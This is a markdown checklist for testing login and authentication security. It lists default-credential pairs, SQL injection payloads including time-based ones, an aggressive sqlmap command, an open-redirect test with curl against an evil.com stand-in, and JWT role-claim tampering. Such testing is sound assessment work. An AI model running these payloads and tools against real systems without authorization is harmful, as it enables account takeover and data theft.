# 🌍 Login & Authentication Testing

This document details **manual and automated testing** for **login security, authentication bypass, SQL injection, and open redirects.**

---

## **1️⃣ Identifying Login & Authentication Pages**

### **Extract Login & Auth Endpoints**
```bash
cat auth_pages.txt | grep -Ei "/(login|auth|session|signin|api/login)" > login_pages.txt
```
✅ **Filters login-related pages for further testing.**

---

## **2️⃣ Security Checks on Login Pages**

### **Check if HTTPS is Enforced**
- **Ensure login forms use `https://` instead of `http://`.**
- **Check for mixed content warnings in the browser console.**

### **Test for Default Credentials**
- **Try default username-password combinations:**
```bash
admin:admin
test:test
root:root
user:user
admin:password
```
✅ **If default credentials work, report weak authentication.**

---

## **3️⃣ SQL Injection Testing**

### **Test Login Form for SQL Injection Using `arjun`**
```bash
arjun -u "https://target.com/login" -m POST
```
✅ **Identifies hidden parameters in login requests.**

### **Manual SQL Injection Payloads**
```sql
admin' OR 1=1-- -
admin' OR sleep(5)--
id = 1'XOR(if(now()=sysdate(),sleep(2*2),0))OR'
```
✅ **Test login input fields for SQL injection vulnerabilities.**

### **Automated SQL Injection Testing**
```bash
sqlmap -m login_pages.txt --batch --risk=3 --level=5
```
✅ **Runs SQLi attacks against login forms.**

---

## **4️⃣ Open Redirect Testing in Login Pages**

### **Identify NextURL Parameter in Redirects**
```bash
cat login_pages.txt | grep -Ei "url=|uri=|redirect=|link=|to=|forward=|next=" > redirect_candidates.txt
```
✅ **Finds redirect parameters commonly vulnerable to open redirect attacks.**

### **Test Open Redirect Vulnerability**
```bash
curl "https://target.com/login?nextURL=http://evil.com"
```
✅ **If redirected to `evil.com`, report open redirect vulnerability.**

---

## **5️⃣ JWT Manipulation Testing**

### **Decode JWT & Modify Claims**
1️⃣ **Copy JWT token from session storage.**  
2️⃣ **Decode using [jwt.io](https://jwt.io).**  
3️⃣ **Modify `"role": "admin"` and re-encode.**  
✅ **If access is granted after modification, report authentication bypass.**

---

### **🚀 Now, login & authentication pages are fully tested for security vulnerabilities!**

